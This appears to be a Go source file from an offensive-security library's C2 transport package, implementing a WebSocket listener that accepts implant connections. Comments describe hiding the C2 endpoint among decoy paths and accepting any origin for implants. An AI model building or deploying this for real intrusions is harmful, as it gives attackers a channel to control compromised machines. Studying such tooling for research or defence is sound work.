package websocket

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"

	cws "github.com/coder/websocket"

	"github.com/oioio-space/maldev/c2/transport"
)

// listenerConfig collects ListenerOption values.
type listenerConfig struct {
	tlsCfg           *tls.Config
	acceptedSubproto []string
	originPatterns   []string
	compression      cws.CompressionMode
	connChBuffer     int
}

// ListenerOption tunes [NewListener] / [NewServer] / [Handler].
type ListenerOption func(*listenerConfig)

// WithTLS wraps the listener in TLS (wss://). When nil, the listener
// serves plain ws:// — operator typically fronts it with Caddy/nginx.
func WithTLS(cfg *tls.Config) ListenerOption {
	return func(c *listenerConfig) { c.tlsCfg = cfg }
}

// WithAcceptedSubprotocols sets the server-side accepted subprotocol
// list. The handshake picks the first client-offered value present
// here; if none match, the upgrade is rejected.
func WithAcceptedSubprotocols(subs ...string) ListenerOption {
	return func(c *listenerConfig) { c.acceptedSubproto = subs }
}

// WithOriginPatterns sets the CSRF-defence origin allowlist. When
// empty (default) the listener accepts ANY origin — appropriate for
// an implant channel where the client has no browser Origin header.
// Set this when co-hosting the WS endpoint inside a real site whose
// browser users should NOT be able to open a WS to it.
func WithOriginPatterns(patterns ...string) ListenerOption {
	return func(c *listenerConfig) { c.originPatterns = patterns }
}

// WithServerCompression toggles permessage-deflate server-side.
// Default on, matching Chrome.
func WithServerCompression(enabled bool) ListenerOption {
	return func(c *listenerConfig) {
		if enabled {
			c.compression = cws.CompressionContextTakeover
		} else {
			c.compression = cws.CompressionDisabled
		}
	}
}

// Listener is the accept-side WebSocket primitive. Implements
// [github.com/oioio-space/maldev/c2/transport.Listener].
type Listener struct {
	connCh   chan acceptedConn
	srv      *http.Server // nil when operator mounts handler elsewhere
	addr     net.Addr
	closeMu  sync.Mutex
	closed   bool
	shutdown chan struct{}
}

type acceptedConn struct {
	c   net.Conn
	err error
}

// signalConn wraps a net.Conn and closes a done channel on Close.
// Used to hold the http handler alive for the conn's lifetime under
// the Accept-based API: the handler blocks on done until the
// downstream consumer Close()s the wrapped conn.
type signalConn struct {
	net.Conn
	done chan struct{}
	once sync.Once
}

func (s *signalConn) Close() error {
	err := s.Conn.Close()
	s.once.Do(func() { close(s.done) })
	return err
}

// NewServer builds an http.Handler and a Listener queue. Mount the
// handler anywhere — the Listener.Accept side surfaces the accepted
// conns. Use this for co-hosting C2 with decoy paths in one
// http.Server.
func NewServer(opts ...ListenerOption) (http.Handler, *Listener) {
	cfg := listenerConfig{
		compression:  cws.CompressionContextTakeover,
		connChBuffer: 16,
	}
	for _, opt := range opts {
		opt(&cfg)
	}
	l := &Listener{
		connCh:   make(chan acceptedConn, cfg.connChBuffer),
		shutdown: make(chan struct{}),
	}
	h := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		acceptOpts := &cws.AcceptOptions{
			Subprotocols:       cfg.acceptedSubproto,
			OriginPatterns:     cfg.originPatterns,
			CompressionMode:    cfg.compression,
			InsecureSkipVerify: len(cfg.originPatterns) == 0,
		}
		wsConn, err := cws.Accept(w, r, acceptOpts)
		if err != nil {
			// Accept already wrote a 4xx — nothing more to do.
			return
		}
		// NetConn uses context.Background() — tying it to r.Context()
		// would cancel the I/O the moment this handler returns, which
		// is exactly what we DON'T want under the Accept-based API.
		// The handler stays alive (blocked on done) until the
		// downstream consumer Close()s the wrapped conn.
		done := make(chan struct{})
		netConn := &signalConn{
			Conn: cws.NetConn(context.Background(), wsConn, cws.MessageBinary),
			done: done,
		}
		select {
		case l.connCh <- acceptedConn{c: netConn}:
			<-done // hold the request open for the conn's lifetime
		default:
			// Backpressure protection: queue full, drop the conn.
			_ = wsConn.Close(cws.StatusTryAgainLater, "queue full")
		}
	})
	return h, l
}

// Handler is sugar for the http.Handler half of [NewServer].
func Handler(opts ...ListenerOption) http.Handler {
	h, _ := NewServer(opts...)
	return h
}

// NewListener stands up a complete WS server: it opens a TCP
// listener on addr, mounts the WS handler at path, and starts an
// http.Server. Operators wanting decoy paths use [NewServer] + their
// own ServeMux.
func NewListener(addr, path string, opts ...ListenerOption) (*Listener, error) {
	cfg := listenerConfig{}
	for _, opt := range opts {
		opt(&cfg)
	}

	h, lst := NewServer(opts...)

	if path == "" {
		path = "/"
	}
	mux := http.NewServeMux()
	mux.Handle(path, h)

	tcpLn, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("ws listen %s: %w", addr, err)
	}

	srv := &http.Server{
		Handler:   mux,
		TLSConfig: cfg.tlsCfg,
	}
	lst.srv = srv
	lst.addr = tcpLn.Addr()

	go func() {
		if cfg.tlsCfg != nil {
			_ = srv.ServeTLS(tcpLn, "", "")
		} else {
			_ = srv.Serve(tcpLn)
		}
		close(lst.shutdown)
	}()

	return lst, nil
}

// Accept blocks until a new WS connection arrives or ctx is
// cancelled.
func (l *Listener) Accept(ctx context.Context) (net.Conn, error) {
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case <-l.shutdown:
		return nil, errors.New("ws listener closed")
	case ac := <-l.connCh:
		if ac.err != nil {
			return nil, ac.err
		}
		return ac.c, nil
	}
}

// Close shuts the underlying http.Server (if any) with a 3s grace
// period. Idempotent.
func (l *Listener) Close() error {
	l.closeMu.Lock()
	if l.closed {
		l.closeMu.Unlock()
		return nil
	}
	l.closed = true
	srv := l.srv
	l.closeMu.Unlock()

	if srv == nil {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	return srv.Shutdown(ctx)
}

// Addr returns the bound address. Nil when the operator used
// [Handler] without [NewListener].
func (l *Listener) Addr() net.Addr { return l.addr }

// Compile-time assertion: Listener satisfies transport.Listener.
var _ transport.Listener = (*Listener)(nil)
